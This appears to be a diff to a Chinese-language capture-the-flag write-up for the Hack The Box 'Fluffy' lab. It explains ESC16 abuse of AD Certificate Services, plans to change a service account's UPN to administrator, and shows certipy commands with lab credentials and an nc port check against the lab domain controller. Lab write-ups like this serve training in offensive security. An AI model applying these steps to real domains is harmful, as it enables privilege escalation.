@@ -434,3 +434,24 @@ Certificate Templates                   : [!] Could not find any certificate tem
 ```
 #### 根据官方文档：应该分析证书工具的输出，以确定此安装容易受到ESC16攻击。这种攻击利用了一个错误的配置，其中CA被全局配置为禁用包括szOID_NTDS_CA_SECURITY_EXT安全扩展。
 #### 要利用这一点，我们首先需要将ca_svc用户的UPN（用户主体名称）更新为管理员。
+
+```
+[★]$ certipy account -u p.agila -p prometheusx-303 -dc-ip 10.129.60.35 -user ca_svc read
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Reading attributes for 'ca_svc':
+    cn                                  : certificate authority service
+    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
+    name                                : certificate authority service
+    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
+    sAMAccountName                      : ca_svc
+    servicePrincipalName                : ADCS/ca.fluffy.htb
+//没有看到 userPrincipalName为ca_svc@fluffy.htb
+```
+#### certipy find 是否成功，取决于：
+```
+1️⃣ 能不能连到 DC（IP / 389 / 445）
+2️⃣ 凭据是否有效
+[★]$ nc -zv 10.129.60.35 445
+fluffy.htb [10.129.60.35] 445 (microsoft-ds) open
+```
